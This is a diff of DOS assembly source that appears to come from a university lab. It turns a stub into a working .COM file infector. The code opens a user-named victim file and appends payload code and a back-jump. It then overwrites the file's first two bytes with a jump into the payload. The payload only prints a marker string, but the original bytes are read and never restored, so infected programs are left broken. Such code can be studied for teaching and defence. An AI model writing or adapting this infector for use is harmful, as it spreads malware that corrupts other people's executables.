@@ -3,8 +3,6 @@
 org 100h
 start:
 
-    lea ax, data
-
     ; print input request
     lea dx, input_msg
     mov ah, 09h
@@ -28,40 +26,115 @@ start:
     add bx, ax
     mov byte ptr[bx], 0
 
-    ; set dta on file
+    ; setting dta on file
     mov ah, 1ah
     lea dx, file
     int 21h
 
-    ; find victim file
+    ; finding victim file
     pop dx ; get filename.text address from stack
     mov ah, 4eh
     int 21h
 
-    ; output found file name
+    ; opening file (file descriptor -> ax)
     lea dx, file.name
+    mov ax, 3D02h
+    int 21h
+
+    ; file error handling
+    jnc file_err_skip
+    lea dx, file_err_msg
     mov ah, 09h
     int 21h
-
-    ; open file
-    mov ax, 3D02h
-    lea dx, file.name
+    mov ah, 4ch
     int 21h
 
-    ; ; записываем тело вируса в начало файла
-    ; xchg ax,bx
-    ; mov dx,100h
-    ; mov ah,40h
-    ; mov cl,vir_len
-    ; int 21h
+file_err_skip:
 
-    ; ; закрываем файл и выходим
-    ; mov ah,3eh
-    ; int 21h
-    ; ret
+    ; moving carret to the end
+    mov cx, 0
+    mov dx, 0
+    mov bx, ax ; file descriptor (ax) -> bx
+    mov ax, 4202h
+    int 21h
+    mov payload_offset[0], dx
+    mov payload_offset[1], ax
+    mov payload_offset_near, al
+
+    ; writing payload code
+    lea dx, payload_code
+    lea cx, payload_data
+    sub cx, offset payload_code
+    mov ah, 40h
+    int 21h
+
+    ; calculating back-jump
+    lea ax, payload_data
+    sub ax, offset payload_code
+    sub ax, offset payload_offset_near
+    xchg al, ah
+    mov al, 0ebh ; jmp code
+    sub ah, 4
+    mov word_buffer, ax
+
+    ; writing back-jump
+    lea dx, word_buffer
+    mov cx, 2
+    mov ah, 40h
+    int 21h
+
+    ; writing payload data
+    lea dx, payload_data
+    lea cx, data
+    sub cx, offset payload_data
+    mov ah, 40h
+    int 21h
+    
+    ; moving carret to the start
+    mov cx, 0
+    mov dx, 0
+    mov ax, 4200h
+    int 21h
+
+    ; reading first 2 bytes:
+    mov cx, 2
+    lea dx, leading_2_bytes
+    mov ah, 3fh
+    int 21h
+    
+    ; moving carret to the start
+    mov cx, 0
+    mov dx, 0
+    mov ax, 4200h
+    int 21h
+
+    ; inserting load injection
+    mov al, 0ebh ; jmp code
+    mov ah, payload_offset_near ; jmp offset
+    sub ah, 2
+    mov word_buffer, ax
+    lea dx, word_buffer
+    mov cx, 2
+    mov ah, 40h
+    int 21h
+
+    ; closing file
+    mov ah, 3eh
+    int 21h
+    ret
 
     mov ah, 4ch
     int 21h
+
+payload_code:
+
+    lea dx, pd_str
+    mov ah, 09h
+    int 21h
+
+payload_data:
+
+    pd_str db '<< PAYLOAD >>', 13, 10, '$'
 
 data:
     
@@ -85,8 +158,15 @@ data:
     filename Str13 <>
     file DTAFileInfo <>
 
+    back_jump db ?
+    word_buffer dw ?
+    payload_offset_near db ?
+    payload_offset dw ?, ?
+    leading_2_bytes db 2 dup (?)
     file_mask db 'lab3v.com', 0
-    err_msg db 'Error, can not find or open such file.','$'
+    file_err_msg db 'Error, can not find or open such file.', 13, 10, '$'
     input_msg db 'Input the target filename >> ','$'
+
+afterall:
 
 end start
